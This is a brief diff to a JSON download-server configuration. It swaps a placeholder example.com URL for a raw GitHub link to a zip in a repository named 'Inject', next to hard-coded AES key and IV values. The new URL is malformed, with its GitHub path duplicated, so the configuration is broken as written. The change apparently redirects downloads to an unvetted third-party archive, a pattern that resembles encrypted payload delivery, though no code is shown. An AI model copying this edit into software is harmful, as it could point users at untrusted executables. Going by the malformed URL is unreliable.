@@ -8,7 +8,7 @@
     },
     {
       "name": "Server 2", 
-      "download_url": "https://example.com/files2.zip",
+      "download_url": "https://github.com/zxvaibhav/Inject/raw/refs/heads/main/https://github.com/zxvaibhav/Inject/raw/refs/heads/main/vaibhav.zip",
       "aes_key": "key2_32byteslongkey123456789012",
       "aes_iv": "iv2_16byteslongiv"
     },
